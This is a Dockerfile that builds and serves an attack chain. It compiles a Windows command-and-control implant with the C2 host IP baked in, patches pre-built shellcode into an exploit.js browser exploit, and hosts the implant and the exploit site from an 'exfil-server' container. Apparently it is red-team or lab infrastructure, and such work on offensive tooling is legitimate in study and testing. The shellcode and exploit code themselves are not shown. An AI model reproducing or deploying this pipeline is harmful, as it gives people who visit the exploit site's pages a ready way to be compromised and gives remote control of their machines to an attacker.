# Stage 1: Build implant.exe + generate shellcode + patch exploit.js
# Debian is used because msfvenom is no longer needed — only mingw-w64 and python3
FROM debian:bookworm-slim AS builder

ARG C2_HOST_IP

RUN apt-get update && apt-get install -y --no-install-recommends \
    make \
    mingw-w64 \
    python3 \
    && rm -rf /var/lib/apt/lists/*

# Compile implant.exe with host IP baked in
WORKDIR /opt/c2
COPY c2-server/C2-Server-and-Implant/ ./
RUN make bin/windows/implant.exe C2_HOST_IP=$C2_HOST_IP

# Copy exploit site and shellcode generation scripts
WORKDIR /opt/exploit
COPY exfil-server/exploit-contents/ ./

WORKDIR /opt/shellcode-gen
COPY exfil-server/shellcode-generation/ ./

# Use pre-built shellcode — run `make HOST_IP=<ip>` in shellcode-generation/ on the host
# before docker compose up --build to regenerate with a new IP.
RUN cp /opt/shellcode-gen/bin/final_shellcode.bin /tmp/shellcode.bin

# Patch generated shellcode into exploit.js
RUN printf '%s\n' \
    'import struct, re' \
    'data = open("/tmp/shellcode.bin", "rb").read()' \
    'r = len(data) % 4' \
    'if r: data += b"\x00" * (4 - r)' \
    'ints = struct.unpack("<" + "I" * (len(data)//4), data)' \
    'arr = "[" + ", ".join(str(i) for i in ints) + "]"' \
    'content = open("/opt/exploit/exploit.js").read()' \
    'patched, n = re.subn(r"^var shellcode = \[.*?\];", "var shellcode = " + arr + ";", content, flags=re.MULTILINE)' \
    'assert n, "shellcode line not found in exploit.js"' \
    'open("/opt/exploit/exploit.js", "w").write(patched)' \
    'print("exploit.js patched with", n, "replacement(s)")' \
    > /tmp/patch.py && python3 /tmp/patch.py

# Stage 2: Runtime image (lean)
FROM python:3.11-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
    nodejs \
    npm \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /opt/exploit

# Copy freshly compiled implant.exe from builder
COPY --from=builder /opt/c2/bin/windows/implant.exe ./

# Copy exploit site with shellcode patched during build
COPY --from=builder /opt/exploit/ ./exploit-contents/

# Copy web server (replaces python3 -m http.server once server.py is complete)
COPY exfil-server/web-server/ ./web-server/

EXPOSE 8000
EXPOSE 8888

# TODO: Replace python3 -m http.server with web-server/server.py once implemented
CMD ["/bin/sh", "-c", "cd /opt/exploit/exploit-contents && node server.js 8888 & cd /opt/exploit && python3 -m http.server 8000 --bind 0.0.0.0"]
